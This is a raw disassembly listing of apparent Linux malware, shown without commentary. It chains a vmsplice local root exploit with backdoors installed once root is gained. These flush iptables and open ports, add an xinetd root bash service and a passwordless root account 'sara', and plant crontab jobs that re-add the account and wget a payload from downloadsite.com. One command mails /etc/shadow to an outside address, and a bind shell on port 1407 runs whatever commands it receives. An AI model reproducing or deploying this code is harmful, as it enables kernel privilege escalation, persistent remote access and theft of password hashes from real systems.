xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push sym.__libc_csu_fini
push sym.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x8048910
pop ebx
add ebx, 0x2074
mov edx, dword [ebx - 4]
test edx, edx
je 0x8048926
call loc.imp.__gmon_start__
pop eax
pop ebx
leave
ret
jmp dword [reloc.__gmon_start__]
push ebp
mov ebp, esp
sub esp, 8
cmp byte [obj.completed.5764], 0
je 0x804894b
jmp 0x804895d
add eax, 4
mov dword [obj.p.5762], eax
call edx
mov eax, dword [obj.p.5762]
mov edx, dword [eax]
test edx, edx
jne 0x8048941
mov byte [obj.completed.5764], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.__JCR_LIST__]
test eax, eax
je 0x8048981
mov eax, 0
test eax, eax
je 0x8048981
mov dword [esp], obj.__JCR_LIST__
call eax
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x80494e3
xor ebx, ebx
call eax
mov eax, dword [ebx + 0x804a8a0]
sub ebx, 4
cmp eax, 0xffffffff
jne 0x80494d3
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x10
mov eax, esp
and eax, 0xffffe000
mov eax, dword [eax]
mov dword [var_8h], eax
mov eax, dword [var_8h]
mov dword [var_ch], eax
mov dword [var_10h], 0
jmp 0x8048b79
mov eax, dword [var_ch]
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 4
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 8
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 0xc
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 0x10
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 0x14
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 0x18
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048b71
mov eax, dword [var_ch]
add eax, 0x1c
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048b71
mov ecx, dword [var_ch]
add ecx, 4
mov edx, dword [var_ch]
add edx, 8
mov eax, dword [var_ch]
add eax, 0xc
mov dword [eax], 0
mov eax, dword [eax]
mov dword [edx], eax
mov eax, dword [edx]
mov dword [ecx], eax
mov edx, dword [ecx]
mov eax, dword [var_ch]
mov dword [eax], edx
mov ecx, dword [var_ch]
add ecx, 0x10
mov ebx, dword [var_ch]
add ebx, 0x14
mov edx, dword [var_ch]
add edx, 0x18
mov eax, dword [var_ch]
add eax, 0x1c
mov dword [eax], 0
mov eax, dword [eax]
mov dword [edx], eax
mov eax, dword [edx]
mov dword [ebx], eax
mov eax, dword [ebx]
mov dword [ecx], eax
mov eax, dword [var_ch]
add eax, 0x24
mov dword [var_ch], eax
mov edx, dword [var_ch]
add edx, 4
mov eax, dword [var_ch]
add eax, 8
mov dword [eax], 0xffffffff
mov eax, dword [eax]
mov dword [edx], eax
mov edx, dword [edx]
mov eax, dword [var_ch]
mov dword [eax], edx
jmp 0x8048b86
add dword [var_ch], 4
add dword [var_10h], 1
cmp dword [var_10h], 0x3f2
jle 0x8048a57
mov edx, 0x814aa18
mov eax, sym.exit_code
mov dword [var_sp_10h], 0x7b
mov dword [var_8h], edx
mov dword [var_ch], 0x246
mov dword [var_10h], 0x73
mov dword [esp], eax
iretd
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call sym.imp.getuid
test eax, eax
je 0x8049086
mov dword [var_4h], 0
mov dword [esp], 0x8049867
call sym.die
mov dword [esp], str.HISTFILE_dev_null
call sym.imp.putenv
call sym.open_firewall
call sym.classic_backdoors
call sym.basic_backdoor
leave
ret
jmp dword [reloc.getuid]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [errnum]
mov dword [esp], eax
call sym.imp.strerror
mov dword [var_8h], eax
cmp dword [errnum], 0
je 0x80489a7
mov dword [format], str._____s:__s_n
jmp 0x80489ae
mov dword [format], str._____s_n
mov eax, dword [var_8h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
mov eax, dword [format]
mov dword [esp], eax
call sym.imp.printf
mov eax, dword [obj.stdout]
mov dword [esp], eax
call sym.imp.fflush
mov eax, dword [obj.stderr]
mov dword [esp], eax
call sym.imp.fflush
mov dword [esp], 1
call sym.imp.exit
jmp dword [reloc.putenv]
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], str._usr_sbin_iptables__P_INPUT_ACCEPT
call sym.imp.system
mov dword [esp], str._usr_sbin_iptables__F_INPUT
call sym.imp.system
mov dword [esp], str._usr_sbin_iptables__I_INPUT__p_tcp___dport_1407__j_ACCEPT
call sym.imp.system
mov dword [esp], str._usr_sbin_iptables__I_INPUT__p_tcp___dport_14071__j_ACCEPT
call sym.imp.system
mov eax, 0
leave
ret
jmp dword [reloc.system]
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [size], 0x8049524
mov dword [esp], str._etc_xinetd.d_sara
call sym.imp.fopen
mov dword [var_10h], eax
cmp dword [var_10h], 0
jne 0x8048be5
mov dword [var_14h], 1
jmp 0x8048e87
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0xd
mov dword [size], 1
mov dword [esp], str.service_sara_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 2
mov dword [size], 1
mov dword [esp], 0x8049548
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0x16
mov dword [size], 1
mov dword [esp], str._tsocket_type__stream_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0x10
mov dword [size], 1
mov dword [esp], str._tprotocol__tcp_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0xb
mov dword [size], 1
mov dword [esp], str._twait__no_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0xe
mov dword [size], 1
mov dword [esp], str._tport__14071_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0xd
mov dword [size], 1
mov dword [esp], str._tuser__root_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 0x14
mov dword [size], 1
mov dword [esp], str._tserver___bin_bash_n
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [nitems], 2
mov dword [size], 1
mov dword [esp], 0x80495b1
call sym.imp.fwrite
mov eax, dword [var_10h]
mov dword [esp], eax
call sym.imp.fclose
mov dword [size], 0x80495b4
mov dword [esp], str._etc_services
call sym.imp.fopen
mov dword [var_bp_ch], eax
cmp dword [var_bp_ch], 0
jne 0x8048d54
mov dword [var_14h], 1
jmp 0x8048e87
mov eax, dword [var_bp_ch]
mov dword [stream], eax
mov dword [nitems], 0xf
mov dword [size], 1
mov dword [esp], str.sara_t14071_tcp_n
call sym.imp.fwrite
mov eax, dword [var_bp_ch]
mov dword [esp], eax
call sym.imp.fclose
mov dword [esp], str._usr_bin_killall_xinetd
call sym.imp.system
mov dword [esp], str._usr_sbin_xinetd
call sym.imp.system
mov dword [size], 0x80495b4
mov dword [esp], str._etc_passwd
call sym.imp.fopen
mov dword [var_bp_8h], eax
cmp dword [var_bp_8h], 0
jne 0x8048dc3
mov dword [var_14h], 1
jmp 0x8048e87
mov eax, dword [var_bp_8h]
mov dword [stream], eax
mov dword [nitems], 0x17
mov dword [size], 1
mov dword [esp], str.sara::0:0::_:_bin_bash_n
call sym.imp.fwrite
mov eax, dword [var_bp_8h]
mov dword [esp], eax
call sym.imp.fclose
mov dword [size], 0x80495b4
mov dword [esp], str._etc_crontab
call sym.imp.fopen
mov dword [var_bp_4h], eax
cmp dword [var_bp_4h], 0
jne 0x8048e17
mov dword [var_14h], 1
jmp 0x8048e87
mov eax, dword [var_bp_4h]
mov dword [stream], eax
mov dword [nitems], 0x3f
mov dword [size], 1
mov dword [esp], str.0_16_14____bin_echo__sara::0:0::_:_bin_bash______etc_passwd__n
call sym.imp.fwrite
mov eax, dword [var_bp_4h]
mov dword [stream], eax
mov dword [nitems], 0x6f
mov dword [size], 1
mov dword [esp], str.14______usr_bin_wget__q__b_http:__downloadsite.com_sara_malware__usr_bin_sara_malware__usr_bin_sara_malware
call sym.imp.fwrite
mov eax, dword [var_bp_4h]
mov dword [esp], eax
call sym.imp.fclose
mov dword [esp], str.cat__etc_shadow__mail_saramalware_hotmail.com
call sym.imp.system
mov dword [esp], str.echo_T01e02A03m04a05r06e07i08P09o10r11T12o13d14a15V16i17d18a19e20h21I22m23p24o25s26s27i28v29e30l31t32e33E34s35q36u37e38c39e40r____.sara
call sym.imp.system
mov dword [var_14h], 0
mov eax, dword [var_14h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x150
mov dword [address_len], 0
mov dword [address], 1
mov dword [esp], 2
call sym.imp.socket
mov dword [socket], eax
cmp dword [socket], 0xffffffff
jne 0x8048f11
mov dword [esp], str.Socket
call sym.imp.perror
mov dword [esp], 0
call sym.imp.exit
lea eax, [var_34h]
mov dword [eax], 0
mov dword [eax + 4], 0
mov dword [eax + 8], 0
mov dword [eax + 0xc], 0
mov word [var_34h], 2
mov dword [esp], 0x57f
call sym.imp.htons
mov word [var_32h], ax
mov dword [var_30h], 0
mov dword [var_38h], 0x10
mov eax, dword [var_38h]
mov edx, eax
lea eax, [var_34h]
mov dword [address_len], edx
mov dword [address], eax
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.bind
mov dword [var_ch], eax
cmp dword [var_ch], 0xffffffff
jne 0x8048f8f
mov dword [esp], str.Bind
call sym.imp.perror
mov dword [esp], 0
call sym.imp.exit
mov dword [address], 5
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.listen
lea edx, [var_38h]
lea eax, [var_24h]
mov dword [address_len], edx
mov dword [address], eax
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.accept
mov dword [var_10h], eax
cmp dword [var_10h], 0xffffffff
jne 0x8048fdc
mov dword [esp], str.Accept
call sym.imp.perror
mov dword [esp], 0
call sym.imp.exit
mov dword [flags], 0
mov dword [address_len], 0xfa
lea eax, [string]
mov dword [address], eax
mov eax, dword [var_10h]
mov dword [esp], eax
call sym.imp.recv
lea eax, [string]
mov dword [esp], eax
call sym.imp.system
lea eax, [string]
mov dword [var_13ch], eax
mov dword [var_140h], str.exit
mov dword [var_144h], 5
cld
mov esi, dword [var_13ch]
mov edi, dword [var_140h]
mov ecx, dword [var_144h]
repe cmpsb byte [esi], byte ptr es:[edi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x8048fdc
mov dword [esp], 0
call sym.imp.exit
jmp dword [reloc.socket]
jmp dword [reloc.perror]
jmp dword [reloc.exit]
jmp dword [reloc.htons]
jmp dword [reloc.bind]
jmp dword [reloc.listen]
jmp dword [reloc.accept]
jmp dword [reloc.recv]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
mov eax, 0x13c
mov ebx, dword [arg_8h]
int 0x80
mov dword [var_ch], eax
mov eax, dword [var_ch]
cmp eax, 0xffffff7e
jbe 0x8048a28
call sym.imp.__errno_location
mov edx, dword [var_ch]
neg edx
mov dword [eax], edx
mov dword [var_ch], 0xffffffff
mov eax, dword [var_ch]
add esp, 0x10
pop ebx
pop esi
pop ebp
ret
jmp dword [reloc.__errno_location]
push ebp
mov ebp, esp
push edi
push esi
push ebx
call sym.__i686.get_pc_thunk.bx
add ebx, 0x1519
sub esp, 0x1c
call sym._init
lea eax, [ebx - 0xe0]
lea edx, [ebx - 0xe0]
sub eax, edx
sar eax, 2
mov dword [var_10h], eax
je 0x80494b4
xor edi, edi
mov esi, edx
mov eax, dword [arg_10h]
add edi, 1
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [esi]
add esi, 4
cmp dword [var_10h], edi
jne 0x8049493
add esp, 0x1c
pop ebx
pop esi
pop edi
pop ebp
ret
lea ecx, [argv]
and esp, 0xfffffff0
push dword [ecx - 4]
push ebp
mov ebp, esp
push edi
push ecx
sub esp, 0x60
call sym.imp.getuid
mov dword [obj.uid], eax
call sym.imp.getgid
mov dword [obj.gid], eax
mov eax, dword [obj.uid]
mov edx, dword [obj.uid]
mov ecx, dword [obj.uid]
mov dword [prot], eax
mov dword [length], edx
mov dword [esp], ecx
call sym.imp.setresuid
mov eax, dword [obj.gid]
mov edx, dword [obj.gid]
mov ecx, dword [obj.gid]
mov dword [prot], eax
mov dword [length], edx
mov dword [esp], ecx
call sym.imp.setresgid
mov eax, dword [obj.uid]
test eax, eax
je 0x804911d
mov eax, dword [obj.gid]
test eax, eax
jne 0x8049131
mov dword [length], 0
mov dword [esp], str.___
call sym.die
mov dword [var_20h], 0
mov dword [var_1ch], 0x1000
lea eax, [var_20h]
mov eax, dword [eax]
mov dword [addr], eax
mov eax, dword [addr]
add eax, 0x20
mov dword [var_40h], eax
mov dword [var_10h], 0x1000
mov edx, dword [addr]
mov dword [offset], 0
mov dword [fd], 0xffffffff
mov dword [flags], 0x32
mov dword [prot], 3
mov eax, dword [var_10h]
mov dword [length], eax
mov dword [esp], edx
call sym.imp.mmap
mov dword [var_bp_ch], eax
cmp dword [var_bp_ch], 0xffffffff
jne 0x80491a9
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.mmap
call sym.die
mov eax, dword [var_bp_ch]
mov edx, dword [var_10h]
mov edi, eax
cld
mov ecx, edx
mov eax, 0
rep stosb byte es:[edi], al
mov eax, dword [addr]
mov dword [eax], 0x4000
mov edx, dword [addr]
mov eax, dword [addr]
mov dword [edx + 0xc], eax
mov eax, dword [addr]
mov dword [eax + 4], 1
mov edx, dword [var_40h]
mov eax, sym.kernel_code
mov dword [edx + 0x18], eax
mov eax, dword [addr]
mov eax, dword [eax]
mov dword [var_3ch], eax
mov eax, dword [var_3ch]
add eax, 0x20
mov dword [var_38h], eax
mov dword [var_10h], 0x1000
mov edx, dword [var_3ch]
mov dword [offset], 0
mov dword [fd], 0xffffffff
mov dword [flags], 0x32
mov dword [prot], 3
mov eax, dword [var_10h]
mov dword [length], eax
mov dword [esp], edx
call sym.imp.mmap
mov dword [var_bp_ch], eax
cmp dword [var_bp_ch], 0xffffffff
jne 0x804924c
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.mmap
call sym.die
mov eax, dword [var_bp_ch]
mov edx, dword [var_10h]
mov edi, eax
cld
mov ecx, edx
mov eax, 0
rep stosb byte es:[edi], al
mov eax, dword [var_3ch]
mov dword [eax], 0x4000
mov edx, dword [var_3ch]
mov eax, dword [var_3ch]
mov dword [edx + 0xc], eax
mov eax, dword [var_3ch]
mov dword [eax + 4], 1
mov edx, dword [var_38h]
mov eax, sym.kernel_code
mov dword [edx + 0x18], eax
mov dword [var_18h], 0x1000
mov dword [var_bp_14h], 0
lea eax, [var_18h]
mov eax, dword [eax]
mov dword [var_34h], eax
mov dword [var_10h], 0x1000
mov edx, dword [var_34h]
mov dword [offset], 0
mov dword [fd], 0xffffffff
mov dword [flags], 0x32
mov dword [prot], 3
mov eax, dword [var_10h]
mov dword [length], eax
mov dword [esp], edx
call sym.imp.mmap
mov dword [var_bp_ch], eax
cmp dword [var_bp_ch], 0xffffffff
jne 0x80492f4
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.mmap
call sym.die
mov eax, dword [var_bp_ch]
mov edx, dword [var_10h]
mov edi, eax
cld
mov ecx, edx
mov eax, 0
rep stosb byte es:[edi], al
mov dword [var_10h], 0x32000
mov dword [offset], 0
mov dword [fd], 0xffffffff
mov dword [flags], 0x22
mov dword [prot], 3
mov eax, dword [var_10h]
mov dword [length], eax
mov dword [esp], 0
call sym.imp.mmap
mov dword [var_bp_ch], eax
cmp dword [var_bp_ch], 0xffffffff
jne 0x8049360
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.mmap
call sym.die
mov eax, dword [var_bp_ch]
mov edx, dword [var_10h]
mov edi, eax
cld
mov ecx, edx
mov eax, 0
rep stosb byte es:[edi], al
sub dword [var_10h], 0x2000
mov eax, dword [var_10h]
add eax, dword [var_bp_ch]
mov dword [length], 0x1000
mov dword [esp], eax
call sym.imp.munmap
test eax, eax
jns 0x80493aa
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.munmap
call sym.die
lea eax, [fildes]
mov dword [esp], eax
call sym.imp.pipe
test eax, eax
jns 0x80493d0
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.pipe
call sym.die
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov eax, dword [var_bp_ch]
mov dword [var_30h], eax
mov dword [var_2ch], 0xffffffff
mov dword [length], sym.exit_code
mov dword [esp], 0xd
call sym.imp.signal
mov edx, dword [var_24h]
mov dword [flags], 0
mov dword [prot], 1
lea eax, [var_30h]
mov dword [length], eax
mov dword [esp], edx
call sym._vmsplice
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [length], eax
mov dword [esp], str.vmsplice
call sym.die
mov eax, 0
add esp, 0x60
pop ecx
pop edi
pop ebp
lea esp, [ecx - 4]
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x80494f8
pop ebx
add ebx, 0x148c
call sym.__do_global_dtors_aux
pop ecx
pop ebx
leave
ret
mov ebx, dword [esp]
ret
jmp dword [reloc.close]
jmp dword [reloc.signal]
jmp dword [reloc.fflush]
jmp dword [reloc.strerror]
jmp dword [reloc.mmap]
jmp dword [reloc.munmap]
jmp dword [reloc.pipe]
jmp dword [reloc.setresuid]
jmp dword [reloc.printf]
jmp dword [reloc.fclose]
jmp dword [reloc.getgid]
jmp dword [reloc.fopen]
jmp dword [reloc.fwrite]
jmp dword [reloc.setresgid]
